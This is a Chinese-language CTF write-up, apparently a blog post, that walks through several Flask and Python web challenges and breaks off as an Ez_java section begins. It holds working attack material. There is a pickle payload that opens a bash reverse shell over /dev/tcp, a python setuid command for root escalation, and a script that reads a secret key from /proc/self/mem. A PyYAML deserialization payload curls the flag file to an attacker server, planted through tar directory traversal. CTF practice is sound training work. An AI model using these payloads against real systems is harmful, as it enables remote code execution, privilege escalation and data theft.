+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/verification&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verification</span>():<br>    <span class="hljs-keyword">try</span>:<br>        attribute = session.get(<span class="hljs-string">&#x27;Attribute&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(attribute, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span><br>    <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> secret<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>这里需要修改session，所以可能需要伪造了</p>
+<p>抓包发现cookie</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031123515.png" srcset="/img/loading.gif" lazyload alt="image-20230903112327430"></p>
+<p>解码发现<code>secret_key</code>：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031124947.png" srcset="/img/loading.gif" lazyload alt="image-20230903112452850"></p>
+<p>flask session伪造一下：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031125728.png" srcset="/img/loading.gif" lazyload alt="image-20230903112508529"></p>
+<p>访问：<code>/verification</code>路由</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031128991.png" srcset="/img/loading.gif" lazyload alt="image-20230903112851889"></p>
+<p>&#x2F;ppppppppppick1e</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031129142.png" srcset="/img/loading.gif" lazyload alt="image-20230903112929035"></p>
+<p>获得源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src0de&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src0de</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppppppppppick1e</span>():<br>    <span class="hljs-keyword">try</span>:<br>        username = <span class="hljs-string">&quot;admin&quot;</span><br>        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span><br>        pick1e = request.cookies.get(<span class="hljs-string">&#x27;pick1e&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pick1e <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pick1e = base64.b64decode(pick1e)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> rsp<br>        <span class="hljs-keyword">if</span>  (pick1e):<br>            pick1e = pickle.loads(pick1e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">return</span> error_message<br><br>    <span class="hljs-keyword">return</span> rsp<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GWHT</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里是pickle反序列化，但是过滤了一些东西</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p>
+<p>找到了一个能用的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xx.xxx/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(data))<br></code></pre></td></tr></table></figure>
+
+<p>反弹shell成功，需要suid提权：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031134563.png" srcset="/img/loading.gif" lazyload alt="image-20230903113419484"></p>
+<p>这里可以使用python suid提权</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.8 -c &#x27;import os;os.setuid(0);os.system(&quot;/</span>bin/bash<span class="hljs-string">&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031136440.png" srcset="/img/loading.gif" lazyload alt="image-20230903113609366" style="zoom:50%;" />
+
+
+
+<h4 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>)<br>    m1sery=[request.args.get(<span class="hljs-string">&quot;m1sery&quot;</span>,<span class="hljs-string">&quot;Doctor.Boogipop&quot;</span>)]<br>    <span class="hljs-keyword">if</span>(session.get(<span class="hljs-string">&quot;name&quot;</span>)==<span class="hljs-string">&quot;Dr.Boog1pop&quot;</span>):<br>        blacklist=re.findall(<span class="hljs-string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker no way&quot;</span><br>        <span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;for [<span class="hljs-subst">&#123;name&#125;</span>] in [<span class="hljs-subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;Doctor&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session.get(<span class="hljs-string">&quot;name&quot;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_page</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(os.path.pardir)<br>    <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;templates/&quot;</span> + path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not found&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> render_template(path)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p>直接读环境变量</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/read?file=/</span>proc<span class="hljs-regexp">/1/</span>environ<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031147022.png" srcset="/img/loading.gif" lazyload alt="image-20230903114753784"></p>
+<h5 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h5><p>首先看这段代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure>
+
+<p>这里session的<code>SECRET_KEY</code>是有规律的，我们可以通过读取内存<code>/proc/self/mem</code>读取出key来，但是不能直接读取，我们需要先读取内存映射<code>/proc/self/maps</code>来定位key的位置，再利用<code>/read</code>路由读取key，可以使用如下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests, re, time<br><br>url = <span class="hljs-string">&quot;http://5000.endpoint-64c8f01c2b234d718b0e628fd789c642.m.ins.cloud.dasctf.com:81&quot;</span><br>maps_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/read?file=/proc/self/maps&quot;</span><br>maps_reg = <span class="hljs-string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span><br>maps = re.findall(maps_reg, requests.get(maps_url).text)<br><span class="hljs-built_in">print</span>(maps)<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> maps:<br>    start, end = m.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>], m.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>]<br>    Offset, Length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(start, <span class="hljs-number">16</span>)), <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(end, <span class="hljs-number">16</span>) - <span class="hljs-built_in">int</span>(start, <span class="hljs-number">16</span>))<br>    read_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/read?file=/proc/self/mem&amp;start=<span class="hljs-subst">&#123;Offset&#125;</span>&amp;end=<span class="hljs-subst">&#123;Length&#125;</span>&quot;</span><br>    <span class="hljs-built_in">print</span>(read_url)<br><br>    s = requests.get(read_url,timeout=<span class="hljs-number">6</span>,stream=<span class="hljs-literal">True</span>)<br>    rt = re.findall(<span class="hljs-string">&quot;[a-z0-9]&#123;8&#125;*[a-z0-9]&#123;4&#125;*[a-z0-9]&#123;4&#125;*[a-z0-9]&#123;4&#125;*[a-z0-9]&#123;12&#125;&quot;</span>, s.text)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> rt:<br>        <span class="hljs-built_in">print</span>(rt)<br></code></pre></td></tr></table></figure>
+
+<p>读取到了key之后伪造session，再命令执行</p>
+<h4 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    flag = <span class="hljs-literal">True</span><br>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;frozenset&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;tuple&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;listitems&#x27;</span>,<br>                 <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;apply&#x27;</span>]<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):<br>    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):<br>        os.makedirs(extractdir)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:<br>        tf = tarfile.TarFile(filepath)<br>        tf.extractall(extractdir)<br>        <span class="hljs-keyword">return</span> tf.getnames()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):<br>        os.makedirs(fn)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(upFile)<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M | re.I) != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><br>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(savePath)<br>        upFile.save(savePath)<br><br>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):<br>            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">if</span> request.args:<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            Config = yaml.load(f.read(), Loader=yaml.FullLoader)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>过滤waf函数未被调用这是一个<code>pyyaml反序列化</code>问题，</p>
+<p><strong>上传tar文件时造成目录穿越</strong></p>
+<p>admin.yaml</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pf">- !!python/object/new:str<br>    args: []<br>    <span class="hljs-keyword">state</span>: !!python/tuple<br>    - <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://ip:9999/`cat /f*`&#x27;).read()&quot;</span><br>    - !!python/object/new:staticmethod<br>      args: [<span class="hljs-number">0</span>]<br>      <span class="hljs-keyword">state</span>:<br>        update: !!python/name:exec<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar cPvf kk.tar ..<span class="hljs-regexp">/../</span>config/admin.yaml<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309032036940.png" srcset="/img/loading.gif" lazyload alt="image-20230903203615755"></p>
+<p>上传文件后在 vps 上开启 http 监听，得到访问&#x2F;src?username&#x3D;admin 得到 flag</p>
+<p>大佬wp</p>
+<p><a target="_blank" rel="noopener" href="https://xp0int.top/posts/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WriteUp-By-Xp0int/#d0nt-pl4y-g4m3">https://xp0int.top/posts/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WriteUp-By-Xp0int/#d0nt-pl4y-g4m3</a></p>
+<h4 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h4><p>这个题目其实也不难，比赛看到java就不看了，以后应该多分析分析</p>
+<p>我们可以使用idea打开jar包，然后右键点击<code>add as library</code>，就可以反编译查看源码了</p>
+<p>代码结构：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309071531915.png" srcset="/img/loading.gif" lazyload alt="image-20230907153150727"></p>
+<p>首先看一下<code>IndexController</code>类，查看路由：</p>
